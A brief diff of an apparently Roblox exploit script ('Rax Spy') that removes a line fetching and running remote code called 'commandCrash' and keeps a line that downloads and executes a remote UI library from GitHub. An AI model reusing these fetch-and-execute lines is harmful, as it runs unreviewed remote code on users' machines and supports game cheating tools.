@@ -1,4 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Raxixe2/scripts/main/commandCrash"))()
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 local Window = OrionLib:MakeWindow({Name = "Rax Spy", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
 
